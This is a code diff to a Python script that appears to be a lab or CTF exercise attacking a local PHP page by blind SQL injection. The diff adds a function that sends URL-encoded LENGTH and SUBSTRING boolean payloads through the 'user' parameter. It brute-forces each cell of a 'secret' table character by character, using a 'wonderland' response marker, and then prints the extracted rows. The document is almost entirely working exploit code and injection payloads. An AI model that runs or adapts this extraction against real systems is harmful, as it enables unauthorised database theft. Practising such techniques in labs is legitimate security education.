@@ -127,10 +127,61 @@ def find_columns(my_cookies, name):
         columns.append(current_name)
         offset += 1
 
+# This function will find the actual content within the secret table!
+def find_content(my_cookies, table_name, columns, row_count):
+    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_ @!?-{}.:,;/()[]*=+"
+    data = []
+
+    for offset in range(row_count):
+        row_data = {}
+        for column in columns:
+            current_value = ""
+            # Now finding the length of the content in this cell
+            current_length = 0
+            for i in range(100):
+                url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20"
+                       f"COALESCE(%60{column}%60,%20%27NULL%27)%20FROM%"
+                       f"20secure.%60{table_name}%60%20LIMIT%201%20OFFSET%20{offset}))={i};--%20")
+
+                response = requests.get(url, cookies = my_cookies)
+
+                if "wonderland" in response.text:
+                    current_length = i
+                    break
+
+            if current_length == 0:
+                print("LONG CELL!")
+                exit(1)
+
+            # Now finding the actual content in the cell
+            for position in range(1, current_length + 1):
+                found = False
+                for char in charset:
+                    url = (
+                        f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20"
+                        f"COALESCE(%60{column}%60,%20%27NULL%27)%20FROM%"
+                        f"20secure.%60{table_name}%60%20LIMIT%201%20OFFSET%20{offset}),{position},1)"
+                        f"=%27{char}%27;--%20")
+
+                    response = requests.get(url, cookies = my_cookies)
+
+                    if "wonderland" in response.text:
+                        found = True
+                        current_value += char
+                        break
+
+                if not found:
+                    print("WEIRD CHARACTERS!")
+                    exit(1)
+            row_data[column] = current_value
+        data.append(row_data)
+    return data
+
+
 def main():
 
     # The cookie in order to log in as alice
-    my_cookies = {"PHPSESSID": "INSERT_YOUR_COOKIE_HERE"}
+    my_cookies = {"PHPSESSID": "INSERT YOUR COOKIE HERE"}
 
     length = find_length(my_cookies)
     print(f"The length of the table name is: {length}")
@@ -143,6 +194,11 @@ def main():
 
     columns = find_columns(my_cookies, name)
     print(f"\nThe columns are: {columns}")
+
+    secret_data = find_content(my_cookies, name, columns, row_count)
+    print("\n--- The Secret Data ---")
+    for row in secret_data:
+        print(f"ID: {row['id']} | Random: {row['random']}")
 
 if __name__ == "__main__":
     main()
